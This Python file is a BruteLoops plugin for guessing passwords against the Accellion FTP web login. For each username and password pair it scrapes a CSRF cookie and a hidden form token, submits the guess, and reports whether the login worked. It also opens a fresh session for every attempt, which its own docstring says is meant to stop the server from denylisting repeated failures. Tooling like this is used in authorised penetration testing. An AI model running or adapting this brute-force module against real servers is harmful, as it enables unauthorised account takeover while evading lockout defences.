#!/usr/bin/env python3

import requests
import re
import warnings
from BruteLoops.example.module import Module as BLModule
warnings.filterwarnings('ignore')

'''
# Notes

## Example Post Payload

The `fc` parameter is a value embedded from initial resolution of
the DEFAULT_LANDING. Must be parsed accordingly.

```
user=testo%40wc.com&password=presto&fc=w418-O1LolQa3sNuhib5s18kwLD33f7f3YulC0B3cftanOcg%5E
```

Input field from the landing HTML

<input type="hidden" id="flogin" name="flogin" value="w418-O1LolQa3sNuhib5s18kwLD33f7f3YulC0B3cftanOcg^">

## Invalid Credential Response

```
0||1||Invalid Username/Password.
```
'''

# Default user agent
DEFAULT_UA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) ' \
             'AppleWebKit/537.36 (KHTML, like Gecko) Chr' \
             'ome/58.0.3029.110 Safari/537.36'

# Path to default landing page
#   - Assigns CRSF cookie
#   - Provides value to fc POST parameter (unknown use)
DEFAULT_LANDING = '/courier/web/1000@/wmLogin.html?'

# Path to where the form is posted
DEFAULT_LOGIN   = '/courier/web/1000@/wmUtils.api'

RE_FLOGIN = re.compile('name="flogin" value="(?P<flogin>.+)"><input '\
        'type="hidden" id="logRes"')

class Module(BLModule):
    '''Callable FTP class for the Accellion FTP web interface.
    '''

    name = 'http.accellion_ftp'
    description = brief_description = 'Accellion FTP HTTP interface login module'

    def __init__(self, origin,
            landing_path:'required:False,type:str,help:String path' \
                    ' to the landing page that issues cookies/tokens'= \
                    DEFAULT_LANDING,
            login_path:'required:False,type:str,help:String path to' \
                    ' wo where the auth form is submitted'=DEFAULT_LOGIN,
            user_agent:'required:False,type:str,help:User agent string'= \
                    DEFAULT_UA,
            verify_ssl:'required:False,type:bool,help:Verify SSL'=False,
            *args, **kwargs):
        '''Initialize an FTP object. Parameters:

        - origin - String origin for server in the format: https://host.apex.com
        - landing_path - String path to the landing page that issues cookies/tokens
        - login_path - String path to where the auth form is submitted
        - user_agent - String of custom user agent value
        - verify_ssl - Boolean determining if SSL certificate should be checked
        '''

        self.origin=origin
        self.landing_path=landing_path
        self.login_path=login_path
        self.landing_url=f'{origin}{landing_path}'
        self.auth_url=f'{origin}{login_path}'
        self.user_agent=user_agent
        self.verify_ssl=verify_ssl

    def __call__(self,username,password):
        '''Authentication module called for each set of credentials.
        It uses a fresh `requests.Session` object to acquire a new
        session cookie and fc value from the landing page to assure
        that server-side logic doesn't denylist a given combination of
        values due to multiple failed authentication attempts.

        - username - String username value to guess
        - password - String password value to guess
        '''

        # ====================
        # GET NECESSARY VALUES
        # ====================

        sess = requests.Session()

        # Get a CSRF-TOKEN (cookie)
        resp = sess.get(self.landing_url,
                headers={'User-Agent':self.user_agent}
            )

        if resp.status_code != 200:
            raise Exception(
                    f'Server responded with non 200: {resp.status_code}')

        # Get the flogin line from the response text content
        target=None
        for line in resp.text.split('\n'):
            if line.find('name="flogin"') > 0:
                target=line
                break

        # Get the fc value for the POST request
        if target: match = re.search(RE_FLOGIN,target)

        if target == None or match == None:
            raise Exception(
                    'Failed to acquire flogin token from response body')

        # ======================
        # ATTEMPT AUTHENTICATION
        # ======================

        resp = sess.post(
                self.auth_url,
                data={'username':username,
                    'password':password,
                    'fc':match.groups()[0]},
                headers={
                        'Referer':self.landing_url,
                        'CSRF-TOKEN':resp.cookies['CSRF-TOKEN'],
                        'User-Agent':self.user_agent
                    },
                verify=self.verify_ssl
            )

        if 'Content-Type' not in resp.headers or \
                resp.headers['Content-Type'].find('text') == -1:
            raise Exception(
                    'Unknown response after authentication attempt')

        # =====================================
        # VERIFY CREDENTIALS AND RETURN OUTCOME
        # =====================================

        if resp.text.find('Invalid') > -1:
            return (0, username, password)
        else:
            return (1, username, password)
